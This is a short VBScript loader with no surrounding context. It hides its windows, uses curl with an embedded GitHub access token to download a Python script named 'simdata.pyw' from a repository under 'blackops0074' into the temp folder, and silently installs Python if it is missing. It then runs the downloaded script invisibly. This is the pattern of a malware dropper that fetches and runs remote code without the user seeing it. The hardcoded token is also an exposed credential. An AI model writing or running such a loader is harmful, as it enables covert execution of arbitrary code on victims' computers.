Set oShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Dim tmp, loc
tmp = oShell.ExpandEnvironmentStrings("%TEMP%")
loc = oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")

'Step 1: simdata.pyw download
Dim curlCmd
curlCmd = "cmd /c curl -H ""Authorization: token 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"" -L https://raw.githubusercontent.com/blackops0074/simdata/main/simdata.pyw -o " & tmp & "\s.pyw"
oShell.Run curlCmd, 0, True

'Step 2: Python check
Dim pw1, pw2
pw1 = loc & "\Programs\Python\Python311\pythonw.exe"
pw2 = "C:\Program Files\Python311\pythonw.exe"

If Not fso.FileExists(pw1) And Not fso.FileExists(pw2) Then
    Dim installCmd
    installCmd = "cmd /c curl -L https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe -o " & tmp & "\py.exe"
    oShell.Run installCmd, 0, True
    oShell.Run """" & tmp & "\py.exe"" /quiet PrependPath=1 InstallAllUsers=0", 0, True
    WScript.Sleep 90000
End If

'Step 3: Run
If fso.FileExists(pw1) Then
    oShell.Run """" & pw1 & """ " & tmp & "\s.pyw", 0, False
ElseIf fso.FileExists(pw2) Then
    oShell.Run """" & pw2 & """ " & tmp & "\s.pyw", 0, False
End If
